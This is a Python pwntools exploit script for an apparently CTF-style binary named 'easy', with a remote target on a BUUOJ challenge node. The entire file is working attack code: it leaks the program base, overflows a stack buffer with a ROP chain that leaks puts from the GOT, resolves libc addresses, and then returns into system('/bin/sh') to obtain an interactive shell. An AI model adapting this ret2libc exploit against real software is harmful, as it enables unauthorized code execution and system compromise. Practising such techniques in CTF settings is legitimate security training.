#!/usr/bin/env python
# -*- encoding: utf-8 -*-
'''
@File    :   exp.py
@Time    :   2021/07/26 10:48:08
@Author  :   eur1ka  
@Version :   2.7
@Contact :   eur1ka@163.com
'''
# here put the import lib
from pwn import *
from LibcSearcher import *
import pwnlib
debug = 1
context.log_level = 'debug'
context.arch = 'amd64'
if debug:
    sh = process('easy')
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
    one_offset = [0x45226,0x4527a,0xf03a4,0xf1247]
else:
    IP = 'node4.buuoj.cn'
    port = 1
    sh = remote(IP,port)
    libc = ELF('/home/eur1ka/Desktop/Pwn/libc_file/16-64-libc-2.23.so')
    one_offset = [0x45216,0x4526a,0xf02a4,0xf1147]
elf = ELF('easy')

sh.recvuntil("What's your name?")
sh.send("a"*8)
sh.recvuntil('a'*8)
program_base = u64(sh.recv(6).ljust(8,"\x00")) - 0x8c0
log.info("program_base=>{}".format(hex(program_base)))
# gdb.attach(sh)
# pause()
sh.recvuntil("How long?\n")
sh.sendline(str(0xf0001))
pop_rdi = program_base + 0x0000000000000c43
puts_plt = program_base + elf.plt['puts']
puts_got = program_base + elf.got['puts']
main_addr = program_base + 0xAEE
payload = 'a'*0x258 + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main_addr)
sh.sendline(payload)
puts_addr = u64(sh.recvuntil("\x7f")[-6:].ljust(8,"\x00"))
libc = LibcSearcher('puts',puts_addr)
libc_base = puts_addr - libc.dump("puts")
system_addr = libc_base + libc.dump('system')
binsh_addr = libc_base + libc.dump('str_bin_sh')
log.info("puts=>{}".format(hex(puts_addr)))
sh.recvuntil("What's your name?")
sh.sendline("eur1ka")
sh.recvuntil("How long?\n")
sh.sendline(str(0xf0001))
payload = 'a' * 0x258 + p64(pop_rdi) + p64(binsh_addr) + p64(system_addr)
sh.sendline(payload)
sh.interactive()